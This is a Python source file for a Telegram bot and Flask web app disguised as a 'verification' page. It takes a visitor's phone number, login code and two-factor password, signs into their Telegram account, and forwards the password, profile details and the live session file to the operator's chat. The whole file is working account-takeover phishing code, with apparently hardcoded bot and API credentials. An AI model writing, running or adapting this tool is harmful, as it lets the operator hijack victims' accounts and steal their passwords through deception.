import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from flask import Flask, render_template, request, jsonify
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json
from functools import wraps

# Initialize Flask
app = Flask(__name__)

# Configuration (Set these in Render environment variables)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
session_expiry = 300  # 5 minutes
telegram_clients = {}

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            timeout=15
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        error_str = str(e).lower()
        if 'password' in error_str or '2fa' in error_str:
            return {'success': True, 'requires_2fa': True}
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def send_to_admin(phone, user_info=None, password=None):
    try:
        msg = f"📱 <b>NEW WEBAPP VERIFICATION</b>\n\n📞 Phone: {phone}"
        if user_info:
            msg += f"\n👤 User: {user_info.get('first_name', '')} {user_info.get('last_name', '')}"
            msg += f"\n🔗 @{user_info.get('username', 'N/A')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        if password:
            msg += f"\n🔐 2FA: {password}"
        
        msg += f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        bot.send_message(USER_ID, msg, parse_mode='HTML')
    except:
        pass

def cleanup_sessions():
    current_time = datetime.now()
    expired = []
    for session_id, session in sessions.items():
        if session['expiry'] < current_time:
            expired.append(session_id)
    for session_id in expired:
        del sessions[session_id]

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/process-contact', methods=['POST'])
def process_contact():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        session_id = generate_session_id()
        session_file = generate_session_file(phone)
        
        # Get Telegram client
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        # Send OTP
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'expiry': datetime.now() + timedelta(seconds=session_expiry),
                'attempts': 0
            }
            
            # Notify admin
            try:
                bot.send_message(
                    USER_ID,
                    f"📲 <b>New WebApp Contact</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode='HTML'
                )
            except:
                pass
            
            return jsonify({
                'success': True,
                'session_id': session_id,
                'message': 'OTP sent'
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Invalid OTP format'})
        
        # Check attempts
        session['attempts'] += 1
        if session['attempts'] > 3:
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA required'
                })
            else:
                # Success
                send_to_admin(session['phone'], result.get('user'))
                
                # Send session file
                if os.path.exists(session['session_file']):
                    try:
                        with open(session['session_file'], 'rb') as f:
                            bot.send_document(USER_ID, f, caption=f"Session: {session['phone']}")
                    except:
                        pass
                
                del sessions[session_id]
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verified'
                })
        else:
            if result.get('code_expired'):
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Restart'})
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            return jsonify({'success': False, 'error': 'No password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            send_to_admin(session['phone'], result.get('user'), password)
            
            # Send session file
            if os.path.exists(session['session_file']):
                try:
                    with open(session['session_file'], 'rb') as f:
                        bot.send_document(USER_ID, f, caption=f"2FA Session: {session['phone']}")
                except:
                    pass
            
            del sessions[session_id]
            return jsonify({'success': True, 'message': '2FA verified'})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Wrong password')})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/complete', methods=['POST'])
def complete():
    try:
        data = request.json
        phone = data.get('phone', 'Unknown')
        
        # Final admin notification
        bot.send_message(
            USER_ID,
            f"✅ <b>VERIFICATION COMPLETE</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n🎉 Success!",
            parse_mode='HTML'
        )
        
        return jsonify({'success': True})
    except:
        return jsonify({'success': False})

# ==================== BOT HANDLER ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    """Send WebApp button"""
    try:
        # Get the WebApp URL
        webapp_url = request.host_url.rstrip('/') if request else f"{WEBHOOK_URL.rstrip('/')}"
        
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="🔐 Open Verification",
            web_app=types.WebAppInfo(url=f"{webapp_url}/")
        )
        keyboard.add(webapp_btn)
        
        # Send without storing message
        bot.send_message(
            message.chat.id,
            "Click the button below to verify:",
            reply_markup=keyboard
        )
        
    except Exception as e:
        print(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Auto-delete contact messages"""
    try:
        # Delete the contact message immediately
        bot.delete_message(message.chat.id, message.message_id)
        
        # Send WebApp button again
        start_command(message)
        
    except Exception as e:
        print(f"Contact delete error: {e}")

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Set up webhook for bot"""
    try:
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/bot/{BOT_TOKEN}"
            bot.set_webhook(url=webhook_url)
            print(f"✅ Webhook set: {webhook_url}")
        else:
            print("⚠️ No WEBHOOK_URL set, using polling")
    except Exception as e:
        print(f"❌ Webhook error: {e}")

@app.route(f'/bot/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 403

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions periodically"""
    while True:
        time.sleep(60)
        cleanup_sessions()

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🚀 Telegram WebApp Verification Bot")
    print("="*60)
    
    # Start cleanup thread
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    # Set up webhook or polling
    port = int(os.environ.get('PORT', 5000))
    
    if WEBHOOK_URL and port == 10000:  # Render uses port 10000
        setup_webhook()
        print(f"🌐 WebApp URL: {request.host_url if request else WEBHOOK_URL}")
        print("🤖 Bot running via webhook")
        app.run(host='0.0.0.0', port=port, debug=False)
    else:
        print("🌐 Local development mode")
        print(f"📱 WebApp URL: http://localhost:{port}")
        print("🤖 Bot running via polling")
        
        # Start bot in separate thread
        def run_bot():
            try:
                bot.polling(none_stop=True, timeout=20)
            except Exception as e:
                print(f"Bot error: {e}")
                time.sleep(5)
                run_bot()
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        # Run Flask
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
